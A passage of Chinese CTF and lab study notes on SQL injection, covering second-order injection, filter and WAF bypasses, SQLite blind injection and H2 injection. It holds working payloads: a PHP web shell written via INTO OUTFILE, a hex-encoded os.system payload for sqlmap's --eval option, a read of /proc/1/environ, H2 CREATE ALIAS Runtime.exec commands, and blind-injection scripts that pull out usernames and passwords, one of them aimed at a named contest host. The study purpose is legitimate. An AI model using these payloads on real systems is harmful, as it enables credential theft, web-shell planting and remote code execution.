<p><strong>session_start()</strong> 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。</p>
<p>session_start的作用是开启$_SESION,需要在$_SESION使用之前调用。 PHP $_SESION 变量用于存储关于用户会话（session）的信息</p>
</blockquote>
<p>接着分析：</p>
<p>login.php</p>
<p><img src="/.io//image-20250529220659540-1754809764537-55.png" alt="image-20250529220659540"></p>
<p>PHP mysql_real_escape_string() 函数</p>
<p>定义和用法</p>
<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<p>语法</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string(string,connection)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">string</td>
<td align="left">必需。规定要转义的字符串。</td>
</tr>
<tr>
<td align="left">connection</td>
<td align="left">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
</tr>
</tbody></table>
<p>说明</p>
<p>本函数将 <em>string</em> 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 mysql_query()</p>
<p>可以看到代码对username和passseord的特殊字符进行了转义，想要在这里进行注入就得采取“绕过”，但这不是我们这道题想要的解法，我们就当这里无法注入好了，也就是说在登录页面login.php处无法进行注入。</p>
<p><img src="/.io//image-20250529220818345-1754809764537-58.png" alt="image-20250529220818345"></p>
<p>登录成功后创建<code>session</code>和<code>cookie</code>，<code>session</code>存储<code>username</code>，但<code>session</code>是建立在服务器上的对象，所以无法获取；<code>cookie</code>只是个登录标记，几乎没有任何用处。（会话15分钟后过期）</p>
<p> <strong>login_create.php</strong></p>
<p><img src="/.io//image-20250529220842790-1754809764537-56.png" alt="image-20250529220842790"></p>
<p><img src="/.io//image-20250529220942055-1754809764537-59.png" alt="image-20250529220942055"></p>
<p>创建用户前先查询是否已经存在该账号，若存在则弹出一个对话框，不存在就创建。</p>
<p><img src="/.io//image-20250529220959654-1754809764537-60.png" alt="image-20250529220959654"></p>
<p>这里要注意到：<code>mysql_escape_string()</code>和<code>mysql_real_escape_string()</code>是不同的，前者早在<code>PHP 5.3</code>中被弃用。</p>
<p><strong>mysql_escape_string()</strong> 并不转义 <em>%</em> 和 <em>_</em>。 本函数和mysql_real_escape_string() 完全一样，除了mysql_real_escape_string()接受的是一个连接句柄并根据当前字符集转移字符串之外。**mysql_escape_string()**并不接受连接参数，也不管当前字符集设定。。</p>
<p>也就是说：<code>mysql_escape_string()</code>没办法判断当前的编码，<code>mysql_real_escape_string()</code>之所以能够防注入是因为同时指定了服务端的编码和客户端的编码。</p>
<blockquote>
<p>综上：username,password,re_password 这三个字段所传递的字符是要被转义的。</p>
</blockquote>
<p><strong>pass_change.php</strong></p>
<p><img src="/.io//image-20250529221106484-1754809764537-61.png" alt="image-20250529221106484"></p>
<p>重点来了：</p>
<p>从<code>session</code>中直接获得了当前用户名，且被直接用于更新语句并未做检查。 从根本上来说，插入数据时没有过滤，只是做了转义处理。 若当前用户名中含有注释，便可以修改当前用户名中包含的另一用户的密码，例如注册用户：Dumb’– # 那么他就可以修改用户Dunb的密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">二次排序注入也称为存储型的注入，就是将可能导致</span><br><span class="line">sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发 sql 注入。</span><br><span class="line">二次排序注入思路：</span><br><span class="line">\1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务</span><br><span class="line">端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</span><br><span class="line">\2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的</span><br><span class="line">数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响</span><br><span class="line">应。</span><br><span class="line">\3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。</span><br><span class="line">\4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库</span><br><span class="line">中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服</span><br><span class="line">务端环境中执行。</span><br><span class="line">\5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注</span><br><span class="line">入漏洞利用是否成功。</span><br></pre></td></tr></table></figure>

<p>此例子中我们的步骤是注册一个 Dumb’– # 的账号，接下来登录该帐号后进行修改密码。此时修改的就是 Dumb 的密码</p>
<p>注入点在修改密码处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; WHERE username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure>

<p>要将其变为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; WHERE username=&#x27;$username&#x27;-- # and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure>

<p>也就是执行了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;新密码&#x27;</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;Dumb&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤演示：</strong></p>
<p>注册 Dumb’– # 账号，密码我们随便设置，这里设置为 110</p>
<p><img src="/.io//image-20250529223552517-1754809764537-62.png" alt="image-20250529223552517"></p>
<p>注意此时的数据库中出现了 Dumb’– # 的用户，还要注意此时原账户Dumb的密码为Dumb</p>
<p><img src="/.io//image-20250529223605684-1754809764537-63.png" alt="image-20250529223605684"></p>
<p>登录账户 Dumb’– #,并修改密码为220</p>
<p>查看修改后数据库：</p>
<p><img src="/.io//image-20250529223617108-1754809764537-64.png" alt="image-20250529223617108"></p>
<p>使用账户Dumb，密码220 进行登录：</p>
<p>成功 HACKED </p>
<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p><img src="/.io//image-20250604214031704-1754809764537-66.png" alt="image-20250604214031704"></p>
<p><strong>%09用于语句中间，%0a可以做语句末尾的截断，此外</strong> || &amp;&amp;<strong>(要进行url编码成%26%26)%26这三种也是可以进行末尾的截断的</strong></p>
<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><p><img src="/.io//image-20250604215232685-1754809764537-65.png" alt="image-20250604215232685"></p>
<h3 id="过滤注释符"><a href="#过滤注释符" class="headerlink" title="过滤注释符"></a>过滤注释符</h3><p><img src="/.io//image-20250604214833865-1754809764537-67.png" alt="image-20250604214833865"></p>
<img src="/.io//image-20250604214855091-1754809764537-68.png" alt="image-20250604214855091" style="zoom: 33%;">

<p><img src="/.io//image-20250604214907542-1754809764537-69.png" alt="image-20250604214907542"></p>
<p><img src="/.io//image-20250604215031532-1754809764537-70.png" alt="image-20250604215031532"></p>
<p><strong>题目</strong>发现输入单引号报错，但是注释符不管用。猜测注释符被过滤，看来源码果然被注释了，所以我们可以用单引号闭合，发现成功。之后可以使用联合注入。不过在判断列数时候不能使用order by 去判断需要用?id&#x3D;-1’ union select 1,2,3,4 or ‘1’&#x3D;’1通过不停加数字判断最后根据页面显示是三列，且显示位是2号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">这样sql语句就变成 id=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1 </span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; ),3 or &#x27;1&#x27;=&#x27;1 </span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(password,username) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>









<h3 id="过滤等号"><a href="#过滤等号" class="headerlink" title="过滤等号"></a>过滤等号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">like</span><br><span class="line"></span><br><span class="line">in</span><br><span class="line"></span><br><span class="line">Select(group_concat(table_name))from(information_schema.tables)where((table_schema)in(&quot;test&quot;));</span><br><span class="line"></span><br><span class="line">between and</span><br><span class="line"></span><br><span class="line">regexp</span><br><span class="line"></span><br><span class="line">不等于&lt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/ %09 () %a0</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250604215132542-1754809764537-71.png" alt="image-20250604215132542"></p>
<p> &#x2F;**&#x2F;</p>
<p><img src="/.io//image-20250604215150621-1754809764537-72.png" alt="image-20250604215150621"></p>
<p><img src="/.io//image-20250604215158897-1754809764537-73.png" alt="image-20250604215158897"></p>
<h3 id="单引号过滤："><a href="#单引号过滤：" class="headerlink" title="单引号过滤："></a>单引号过滤：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用$符号: SELECT &#x27;test&#x27;;</span><br><span class="line"></span><br><span class="line">SELECT $$test$$;</span><br><span class="line"></span><br><span class="line">SELECT $quote$test$quote$;</span><br></pre></td></tr></table></figure>

<p>字符拼接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag:</span><br><span class="line"></span><br><span class="line">&#x27;f&#x27;||&#x27;l&#x27;||&#x27;a&#x27;||&#x27;g&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="过滤了and-or"><a href="#过滤了and-or" class="headerlink" title="过滤了and or"></a>过滤了and or</h3><p><img src="/.io//image-20250604215048650-1754809764537-75.png" alt="image-20250604215048650"></p>
<h3 id="unino和select过滤"><a href="#unino和select过滤" class="headerlink" title="unino和select过滤"></a>unino和select过滤</h3><img src="/.io//202409021409099-1754809764537-74.png" alt="image-20240902140934718" style="zoom:33%;">

<p><img src="/.io//202409021409771-1754809764537-76.png" alt="image-20240902140950592"></p>
<p><img src="/.io//202409021410331-1754809764537-77.png" alt="image-20240902141020230"></p>
<h1 id="sqlmap有个–exec"><a href="#sqlmap有个–exec" class="headerlink" title="sqlmap有个–exec"></a>sqlmap有个–exec</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1	union	seselectlect	1,&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;,3	into	outfile	&#x27;/var/www/html/1.php&#x27;#</span><br></pre></td></tr></table></figure>

<p>sqlmap有个–exec可以执行。直接执行会有编码问题。但是可以用fromhex绕</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">题目源码有</span><br><span class="line">request.add_argument(&quot;--eval&quot;, dest=&quot;evalCode&quot;,</span><br><span class="line">            help=&quot;Evaluate provided Python code before the request (e.g. \&quot;import hashlib;id2=hashlib.md5(id).hexdigest()\&quot;)&quot;)</span><br><span class="line">EXP:127.0.0.1?id=1 --eval=exec(bytes.fromhex(&#x27;5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729&#x27;))</span><br><span class="line">16进制解码得：__import__(&#x27;os&#x27;).system(&#x27;env&#x27;)</span><br><span class="line"></span><br><span class="line">另一种做法是-c参数</span><br><span class="line">target.add_argument(&quot;-c&quot;, dest=&quot;configFile&quot;,</span><br><span class="line">            help=&quot;Load options from a configuration INI file&quot;)</span><br><span class="line">其实--proxy-file之类的也可以读取文件。所以从这里看不出什么端倪。得去往下调试。-c是唯一一个可以把整个文件读取出来的。--proxy-file他读不到http这种他就会报错，而不会读取文件内容。</span><br><span class="line">EXP:127.0.0.1?id=1 -c /proc/1/environ            </span><br></pre></td></tr></table></figure>

<h1 id="VNCTF"><a href="#VNCTF" class="headerlink" title="VNCTF"></a>VNCTF</h1><p><code>1&quot;</code>发现回显“账号密码错误！！”，<code>1&#39;</code>发现回显“好像发生了某种错误？？”。到这里可以确诊是sql注入。</p>
<p>接下来burp fuzz一下。过滤了空格，sleep，or，等于号这些。但是都还好。空格可以&#x2F;**&#x2F;代替。or其实根本不需要，直接用and就行，等于号的话用大于小于代替，sleep这个更是幽默——他是sqlite（我试的时候发现对大小写敏感我大概就猜到了），sqlite里没有sleep函数（（（（这里我们使用最经典的randombolb函数延时，逐字符爆破username和password即可</p>
<p>那么大概思路就是一个sqlite的时间盲注。</p>
<p>先试payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/or/**/(case/**/when(2&gt;1)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*</span><br></pre></td></tr></table></figure>

<p>发现明显的时间延迟。</p>
<p>一眼顶针了，后面就是经典的时盲二分法。直接可以拿网上的脚本搓出来。抄脚本下来，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://node.vnteam.cn:46709/login&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,500):</span><br><span class="line"> low = 32</span><br><span class="line"> high = 128</span><br><span class="line"> mid = (low+high)//2</span><br><span class="line"> while(low&lt;high):</span><br><span class="line">     time.sleep(0.2)</span><br><span class="line">     payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span><br><span class="line">#把payload里password换成username打username</span><br><span class="line">     datas = &#123;</span><br><span class="line">         &quot;username&quot;:&quot;1&quot;,</span><br><span class="line">         &quot;password&quot;: payload</span><br><span class="line">     &#125;</span><br><span class="line">     # print(datas)</span><br><span class="line">     start_time=time.time()</span><br><span class="line">     res = requests.post(url=url,json=datas)</span><br><span class="line">     end_time=time.time()</span><br><span class="line">     spend_time=end_time-start_time</span><br><span class="line">     if spend_time&gt;=0.4: #这里需要调一下。要先跑几次必会延迟的请求测试一下平均延时。</span><br><span class="line">         low = mid+1</span><br><span class="line">     else:</span><br><span class="line">         high = mid</span><br><span class="line">     mid = (low+high)//2</span><br><span class="line"> if(mid ==32 or mid ==127):</span><br><span class="line">     break</span><br><span class="line"> flag = flag+chr(mid)</span><br><span class="line"> print(flag)</span><br><span class="line">print(&#x27;\n&#x27;+bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))</span><br><span class="line">//由上，我们爆破出username为nailong，password为woaipangmao114514</span><br><span class="line">//登录获得flag</span><br></pre></td></tr></table></figure>

<h1 id="H2sql注入"><a href="#H2sql注入" class="headerlink" title="H2sql注入"></a><strong>H2sql注入</strong></h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/181032#h2-2">dotCMS 5.1.5：利用H2 SQL注入实现RCE-安全KER - 安全资讯平台 (anquanke.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;CREATE ALIAS EXEC AS CONCAT(&#x27;void e(String cmd) throws java.io.IOException&#x27;,</span><br><span class="line">HEXTORAW(&#x27;007b&#x27;),&#x27;java.lang.Runtime rt= java.lang.Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);&#x27;,HEXTORAW(&#x27;007d&#x27;));</span><br><span class="line">CALL EXEC(&#x27;whoami&#x27;);--+</span><br></pre></td></tr></table></figure>

<p><strong>rce</strong></p>
<p>在可以堆叠注入的情况下。</p>
<p>H2允许用户定义<a target="_blank" rel="noopener" href="https://www.h2database.com/html/commands.html#create_alias">函数别名</a>，因此可以执行Java代码。简单的查询语句如下所示，该语句可以创建名为REVERSE的函数别名，其中包含我们构造的Java代码payload。然后我们可以使用CALL语句调用这个别名，执行我们的Java payload。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS REVERSE AS </span><br><span class="line"></span><br><span class="line">$$ String reverse(String s)&#123; return new StringBuilder(s).reverse().toString();&#125;$$;</span><br><span class="line"></span><br><span class="line">CALL REVERSE(&#x27;Test&#x27;);</span><br></pre></td></tr></table></figure>

<p>为了实现远程代码执行（RCE），攻击者可以通过java.lang.Runtime.exec()来执行系统命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS Infernity AS </span><br><span class="line"></span><br><span class="line">$$ void e(String cmd) throws java.io.IOException </span><br><span class="line"></span><br><span class="line">&#123;java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);&#125;$$</span><br><span class="line"></span><br><span class="line">CALL Infernity(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>



<h1 id="SQLlite注入"><a href="#SQLlite注入" class="headerlink" title="SQLlite注入"></a>SQLlite注入</h1><p>布尔盲注</p>
<p>布尔盲注通过查询正确和错误返回的页面不同来判断数据内容。 SQLite不支持ascii，所以直接通过字符去查询，这里和mysql不同，这个区分大小写。也没有mid,left等函数。</p>
<p>语句执行正确时，页面返回的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or substr((select group_concat(sql) from sqlite_master),1,1)&lt;&#x27;a&#x27;/*</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250529210555359-1754809764538-89.png" alt="image-20250529210555359"></p>
<p>语句执行错误时，页面返回的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or substr((select group_concat(sql) from sqlite_master),1,1)&gt;&#x27;a&#x27;/*</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250529210605079-1754809764537-78.png" alt="image-20250529210605079"></p>
<p>注入脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://localhost:9000/index.php&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,500):</span><br><span class="line"> low = 32</span><br><span class="line"> high = 128</span><br><span class="line"> mid = (low+high)//2</span><br><span class="line"> while(low&lt;high):</span><br><span class="line">     payload = &quot;-1&#x27; or substr((select hex(group_concat(sql)) from sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;/*&quot;.format(i,chr(mid))</span><br><span class="line">     datas = &#123;</span><br><span class="line">         &quot;id&quot;: payload</span><br><span class="line">     &#125;</span><br><span class="line">     res = requests.post(url=url,data=datas)</span><br><span class="line">​</span><br><span class="line">     if &#x27;Username&#x27; in res.text:</span><br><span class="line">         low = mid+1</span><br><span class="line">     else:</span><br><span class="line">         high = mid</span><br><span class="line">     mid = (low+high)//2</span><br><span class="line"> if(mid ==32 or mid ==127):</span><br><span class="line">     break</span><br><span class="line"> flag = flag+chr(mid)</span><br><span class="line"> print(flag)</span><br><span class="line">​</span><br><span class="line">print(&#x27;\n&#x27;+bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong></p>
<p>SQLite没有sleep()函数，但可以用randomblob(N)函数，randomblob(N) 函数，其作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。SQLite没有if，所以需要使用case……when来代替。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or (case when(substr(sqlite_version(),1,1)&gt;&#x27;3&#x27;) then randomblob(300000000) else 0 end)/*</span><br></pre></td></tr></table></figure>

<p>注入脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://localhost:9000/index.php&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,500):</span><br><span class="line"> low = 32</span><br><span class="line"> high = 128</span><br><span class="line"> mid = (low+high)//2</span><br><span class="line"> while(low&lt;high):</span><br><span class="line">     payload = &quot;-1&#x27; or (case when(substr((select hex(group_concat(sql)) from sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;) then randomblob(300000000) else 0 end)/*&quot;.format(i,chr(mid))</span><br><span class="line">     datas = &#123;</span><br><span class="line">         &quot;id&quot;: payload</span><br><span class="line">     &#125;</span><br><span class="line">     start_time=time.time()</span><br><span class="line">     res = requests.post(url=url,data=datas)</span><br><span class="line">     end_time=time.time()</span><br><span class="line">     spend_time=end_time-start_time</span><br><span class="line">     if spend_time&gt;=2:</span><br><span class="line">         low = mid+1</span><br><span class="line">     else:</span><br><span class="line">         high = mid</span><br><span class="line">     mid = (low+high)//2</span><br><span class="line"> if(mid ==32 or mid ==127):</span><br><span class="line">     break</span><br><span class="line"> flag = flag+chr(mid)</span><br><span class="line"> print(flag)</span><br><span class="line">​</span><br><span class="line">print(&#x27;\n&#x27;+bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>

<h1 id="sql-md5万能密码"><a href="#sql-md5万能密码" class="headerlink" title="sql md5万能密码"></a>sql md5万能密码</h1><p> ffifdyop</p>
<h1 id="安全狗4-0-26550"><a href="#安全狗4-0-26550" class="headerlink" title="安全狗4.0 26550"></a>安全狗4.0 26550</h1><p><img src="/.io//image-20250604214412189-1754809764537-79.png" alt="image-20250604214412189"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1^1^0 没变化 0改为1也没变化 基本字符型</span><br><span class="line">一点一点输入看过滤了什么</span><br><span class="line">当union和select不能连一起时候：union /*!90000benben*/ select</span><br><span class="line">database(右边不能出现右括号时候)  ：database(/*!90000benben*/）</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250604214429878-1754809764538-80.png" alt="image-20250604214429878"></p>
<h1 id="安全狗3-5-12048"><a href="#安全狗3-5-12048" class="headerlink" title="安全狗3.5  12048"></a>安全狗3.5  12048</h1><p><img src="/.io//image-20250604214450687-1754809764538-81.png" alt="image-20250604214450687"></p>
<p>%0a换行符</p>
<p><img src="/.io//image-20250604214502588-1754809764538-82.png" alt="image-20250604214502588"></p>
<p>select和form有可能也禁止在一行用换行： –+b#</p>
<p>测试不能同时存在单词时候或者出现某个单词报错时候可以删掉认为不能同时存在的单词或者出现的单词的字母来测试 </p>
<p><img src="/.io//202409021714964-1754809764538-83.png" alt="image-20240902171402810"></p>
<hr>
<p>两个相同列明引起的报错，报出来id是其中一个</p>
<p><img src="/.io//202409021729598-1754809764538-84.png" alt="image-20240902172914485"></p>
<p>using相当于join on 什么什么的 相当于哪两列完全相同进行关联的    下面这个报出username ：这列完全一致的  （id会忽略过）</p>
<p><img src="/.io//202409021731704-1754809764538-85.png" alt="image-20240902173112640"></p>
<p><img src="/.io//202409021733374-1754809764538-86.png" alt="image-20240902173338222"></p>
<p><img src="/.io//202409021734148-1754809764538-88.png" alt="image-20240902173410032"></p>
<p><img src="/.io//202409021734021-1754809764538-87.png" alt="image-20240902173424915"></p>
<p><img src="/.io//202409021734339-1754809764538-90.png" alt="image-20240902173447198"></p>
<p>超大数据包绕过</p>
<p><img src="/.io//202409021748042-1754809764538-91.png" alt="image-20240902174822839"></p>
<p><img src="/.io//202409021743424-1754809764538-92.png" alt="image-20240902174304306"></p>
<h1 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h1><p><img src="/.io//202409021814004-1754809764538-94.png" alt="image-20240902181445953"></p>
<img src="/.io//202409021813756-1754809764538-95.png" alt="image-20240902181306639" style="zoom:50%;">

<p><img src="/.io//202409021813604-1754809764538-96.png" alt="image-20240902181354450"></p>
<img src="/.io//202409021815155-1754809764538-97.png" alt="image-20240902181530176" style="zoom:50%;">

<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 